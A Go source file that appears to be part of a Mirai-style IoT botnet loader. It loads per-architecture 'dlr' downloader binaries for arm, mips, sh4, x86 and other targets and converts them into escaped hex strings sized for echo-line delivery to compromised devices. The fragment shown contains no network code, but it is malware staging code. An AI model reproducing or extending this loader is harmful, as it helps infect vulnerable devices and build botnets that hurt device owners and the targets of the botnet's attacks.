package main

import (
	"fmt"
	"io/ioutil"

	"github.com/wonderivan/logger"
)

var archs []string = []string{"arm", "arm7", "m68k", "mips", "mpsl", "ppc", "sh4", "spc", "x86"}
var bin_path_partern string = "/root/workspace/release/dlr.%s"
var loader_map map[string][]byte = make(map[string][]byte)

var BINARY_BYTES_PER_ECHOLINE int = 128

//对二进制文件进行处理，对每个字节转成16进制字符串形式，eg: \x12
//并将结果保存在全局map中
func bin_load(arch string) error {
	path := fmt.Sprintf(bin_path_partern, arch)
	bin_file, err := ioutil.ReadFile(path)
	if err != nil {
		return err
	}

	hex_buf := make([]byte, 0)
	for _, i := range bin_file {
		b := fmt.Sprintf("\\x%02x", i)
		hex_buf = append(hex_buf, []byte(b)[:]...)

	}
	loader_map[arch] = hex_buf
	return nil
}

func init() {
	for _, arch := range archs {
		err := bin_load(arch)
		if err != nil {
			logger.Error("arch : %s load bin failed\n", arch)
		}

	}

}
